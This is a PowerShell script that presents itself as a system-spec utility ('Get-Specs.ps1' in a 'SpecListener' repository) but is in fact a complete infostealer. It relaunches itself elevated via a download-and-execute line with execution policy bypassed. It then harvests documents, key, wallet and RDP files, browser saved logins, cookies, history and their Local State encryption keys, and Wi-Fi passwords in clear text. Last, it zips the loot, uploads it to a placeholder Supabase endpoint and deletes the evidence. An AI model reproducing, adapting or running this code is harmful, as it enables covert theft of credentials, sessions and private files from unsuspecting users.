$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    $url = "https://raw.githubusercontent.com/KaloyanSyS32/SpecListener/refs/heads/main/Get-Specs.ps1"
    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"iex (irm '$url')`""
    exit
}

$workDir = Join-Path $env:TEMP "sys_audit_$(Get-Random)"
New-Item -Path $workDir -ItemType Directory -Force | Out-Null

# 1. Targeted File Harvesting (.txt, .pdf, .docx, .xlsx, .key, .wallet)
$exensions = @("*.txt", "*.pdf", "*.docx", "*.xlsx", "*.key", "*.wallet", "*.rdp")
$searchPaths = @("$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads")

foreach ($path in $searchPaths) {
    if (Test-Path $path) {
        Get-ChildItem -Path $path -Include $exensions -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
            $dest = Join-Path $workDir "Files"
            if (-not (Test-Path $dest)) { New-Item -Path $dest -ItemType Directory -Force | Out-Null }
            Copy-Item $_.FullName -Destination $dest -ErrorAction SilentlyContinue
        }
    }
}

# 2. Browser Credential & History Harvesting (Chrome, Edge, Brave)
$browserData = @("Login Data", "Cookies", "Web Data", "History")
$localAppData = $env:LOCALAPPDATA
$browsers = @{
    "Chrome" = "$localAppData\Google\Chrome\User Data"
    "Edge"   = "$localAppData\Microsoft\Edge\User Data"
    "Brave"  = "$localAppData\BraveSoftware\Brave-Browser\User Data"
}

foreach ($b in $browsers.GetEnumerator()) {
    $dest = Join-Path $workDir "Browsers\$($b.Key)"
    New-Item -Path $dest -ItemType Directory -Force | Out-Null
    
    # Capture Encryption Keys (Local State)
    $localState = Join-Path $b.Value "Local State"
    if (Test-Path $localState) { Copy-Item $localState -Destination $dest }

    Get-ChildItem -Path $b.Value -Recurse -Include $browserData -ErrorAction SilentlyContinue | ForEach-Object {
        Copy-Item $_.FullName -Destination $dest -ErrorAction SilentlyContinue
    }
}

# 3. WiFi Profile Harvesting
$wifiPath = Join-Path $workDir "WiFi"
New-Item -Path $wifiPath -ItemType Directory -Force | Out-Null
netsh wlan export profile key=clear folder=$wifiPath | Out-Null

# 4. System & Network Snapshots
$sysInfo = @{
    User    = $env:USERNAME
    Comp    = $env:COMPUTERNAME
    IP      = (Get-NetIPAddress -AddressFamily IPv4).IPAddress
    Process = Get-Process | Select-Object Name, Id
    History = Get-History
}
$sysInfo | ConvertTo-Json | Out-File (Join-Path $workDir "sys_info.json")

# 5. Exfiltration (Compression and Upload)
$zipPath = "$env:TEMP\data_pkg.zip"
Compress-Archive -Path "$workDir\*" -DestinationPath $zipPath -Force

# Note: Replace with your Supabase or Listener URL
$uploadUrl = "https://YOUR_PROJECT.supabase.co/storage/v1/object/data/pkg.zip"
$apiKey = "YOUR_KEY"

$headers = @{
    "Authorization" = "Bearer $apiKey"
    "apikey"        = $apiKey
    "Content-Type"  = "application/zip"
}

$fileBytes = [System.IO.File]::ReadAllBytes($zipPath)
Invoke-RestMethod -Uri $uploadUrl -Method Post -Headers $headers -Body $fileBytes

# Cleanup
Remove-Item $workDir -Recurse -Force
Remove-Item $zipPath -Force
